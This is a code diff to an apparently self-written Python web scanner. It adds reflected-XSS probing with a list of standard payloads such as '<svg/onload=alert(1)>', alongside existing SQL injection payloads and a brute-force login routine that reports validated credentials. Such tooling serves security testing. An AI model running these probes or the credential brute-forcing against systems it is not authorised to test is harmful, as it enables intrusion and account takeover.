@@ -20,6 +20,15 @@ SQLI_PAYLOADS = [
     '"--',
 ]
 
+# Common XSS payloads
+XSS_PAYLOADS = [
+    '<script>alert(1)</script>',
+    '" onmouseover=alert(1) x="',
+    "'><img src=x onerror=alert(1)>",
+    '<svg/onload=alert(1)>',
+    '<b>XSS</b>',
+]
+
 def test_sqli(url, params, method="GET", results=None):
     print("\n[+] Starting SQL Injection tests...")
     vulnerable = False
@@ -68,6 +77,30 @@ def is_sqli_response(response_text):
         if error.lower() in response_text.lower():
             return True
     return False
+
+def test_xss(url, params, method="GET", results=None):
+    print("\n[+] Starting XSS tests...")
+    param_pairs = [p for p in params.split('&') if '=' in p]
+    found_xss = []
+    for i, pair in enumerate(param_pairs):
+        k, v = pair.split('=', 1)
+        for payload in XSS_PAYLOADS:
+            test_params = {p.split('=')[0]: p.split('=')[1] for p in param_pairs}
+            test_params[k] = payload
+            try:
+                if method.upper() == "POST":
+                    resp = requests.post(url, data=test_params, timeout=5)
+                else:
+                    resp = requests.get(url, params=test_params, timeout=5)
+                # Check if payload is reflected in response
+                if payload in resp.text:
+                    found_xss.append(f"{k} with payload: {payload} (reflected)")
+            except Exception as e:
+                pass
+    if results is not None:
+        results['xss'] = found_xss
+    if not found_xss:
+        print("[-] No XSS vulnerabilities detected with basic payloads.")
 
 def brute_force_login(url, form_params, method="POST", success_indicator="Login successful!", results=None, user_file=None, pass_file=None):
     print("\n[+] Starting brute-force credential testing...")
@@ -204,8 +237,9 @@ def auto_test_forms(url, crack_lists=False, fresh_crack=False, results=None, use
             param_str = '&'.join(params)
             form_url = requests.compat.urljoin(url, action) if action else url
             print(f"\n[+] Testing form #{idx}: {form_url} [{method}] with params: {param_str}")
-            form_result = {'url': form_url, 'sqli': [], 'creds': []}
+            form_result = {'url': form_url, 'sqli': [], 'creds': [], 'xss': []}
             test_sqli(form_url, param_str, method, results=form_result)
+            test_xss(form_url, param_str, method, results=form_result)
             if crack_lists:
                 brute_force_login(form_url, param_str, method, results=form_result, user_file=user_file, pass_file=pass_file)
             elif fresh_crack:
@@ -291,19 +325,27 @@ def main():
     print("\n========== SUMMARY ==========")
     if 'pages' in results:
         for page in results['pages']:
-            print(f"\n[Page: {page['url']}]\nPossible SQLi payloads:")
+            print(f"\n[Page: {page['url']}]")
+            print("Possible SQLi payloads:")
             for vuln in page.get('sqli', []):
                 print(f"  - {vuln}")
+            print("Possible XSS payloads:")
+            for xss in page.get('xss', []):
+                print(f"  - {xss}")
             print("Validated credentials:")
             for cred in page.get('creds', []):
                 print(f"  - {cred}")
     if 'crawl' in results:
         for crawl_page in results['crawl']:
-            print(f"\n[Crawled Page: {crawl_page['url']}]\n")
+            print(f"\n[Crawled Page: {crawl_page['url']}]")
             for page in crawl_page.get('pages', []):
-                print(f"  [Form: {page['url']}]\n  Possible SQLi payloads:")
+                print(f"  [Form: {page['url']}]")
+                print("  Possible SQLi payloads:")
                 for vuln in page.get('sqli', []):
                     print(f"    - {vuln}")
+                print("  Possible XSS payloads:")
+                for xss in page.get('xss', []):
+                    print(f"    - {xss}")
                 print("  Validated credentials:")
                 for cred in page.get('creds', []):
                     print(f"    - {cred}")
